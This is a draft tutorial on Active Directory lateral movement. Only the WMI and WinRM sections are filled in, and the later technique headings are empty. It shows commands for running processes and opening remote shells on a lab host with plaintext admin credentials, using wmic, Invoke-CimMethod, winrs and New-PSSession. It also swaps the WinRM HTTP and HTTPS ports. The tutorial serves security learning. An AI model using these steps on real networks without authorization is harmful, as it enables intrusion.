---
title: "AD - Lateral Movement Techniques"
date: 2025-05-30
draft: true
tags: ["active directory", "windows", "lateral movement"]
---

# ACTIVE DIRECTORY - Lateral Movement Techniques
Here, we'll take a look at lateral movement techniques in Active Directory envir/onments.
## 1. WMI and WinRM
### 1.1 WMI
Windows Management Instrumentation (WMI) is capable of creating processes via the Create method from the Win32_Process class. It
communicates through Remote Procedure Calls (RPC)1134 over port 135 for remote access and
uses a higher-range port (19152-65535) for session data.

In order to abuse a remote target via WMI, we need credentaisl of a member of the Administrator local group, which can be also a domain user.

```bash
C:\Users\patrick>wmic /node:192.168.40.21 /user:patrick /password:Cat123!@ process call
create "calc"

 Executing (Win32_Process)->Create()
 Method execution successful.
 Out Parameters:
 instance of __PARAMETERS
 {
 ProcessId = 752;
 ReturnValue = 0;
 };
```

The WMI job returned the PID of the newly created process and a return value of “0”, meaning that the process has been created successfully.

Now we can do the same through powershell with few extra details. We'll need a PSCredential object that will store our session with username and password.

```bash
$username = 'patrick';
$password = 'Cat123!@';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,
$secureString;
```

Now, we want to create a Common Information Mode (CIM). We'll specify DCOM as the protocol for the WMI session, create new sessions against our target IP and supply the PSCredential object, then, define 'calc' as the payload to be executed.

```bash
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.40.21 -Credential $credential -SessionOption $Options
$command = 'calc';
```

In the final step, put all the pieces together, invoke the cmdlet *Invoke-CimMethod* and provide **Win32_Process** as Class name and **Create** as MethodName.

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

This will launch a calculator process on target.

### 1.2 WinRM
As an alternative method to WMI for remote management, WinRM can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.

WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).

```bash
C:\Users\patrick>winrs -r:files01 -u:patrick -p:Cat123!@ "cmd /c hostname & whoami"
FILES01
corp\patrick
```

> To WinRS work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

PowerShell also has WinRM built-in capabilities called PowerShell remoting which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.

```bash
PS C:\Users\patricck> $username = 'patrick';
PS C:\Users\patrick> $password = 'Cat123!@';
PS C:\Users\patrick> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\patrick> $credential = New-Object System.Management.Automation.PSCredential
$username, $secureString;
PS C:\Users\patrick> New-PSSession -ComputerName 192.168.40.21 -Credential $credential
Id Name ComputerName ComputerType State ConfigurationName Availability
-- ---- ------------ ------------ ----- ----------------- ------------
1 WinRM1 192.168.40.21 RemoteMachine Opened Microsoft.PowerShell Available
```

Now, to interact with the open session, we need the cmdlet Enter-PSSession.

```bash
PS C:\Users\patrick> Enter-PSSession 1
[192.168.40.21]: PS C:\Users\patrick\Documents> whoami corp\patrick
[192.168.40.21]: PS C:\Users\patrick\Documents> hostname FILES01
```

**References to Dive Deeper:**

[Microsoft WMI documentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)

[Microsoft WinRM documentation](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)

**Red Team Tools:**

[Impacket’s wmiexec.py](https://github.com/fortra/impacket)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

---

## 2. PsExec

## 3. Pass The Hash (PtH)

## 4. Overpass the Hash

## 5. Pass the Ticket

## 6. DCOM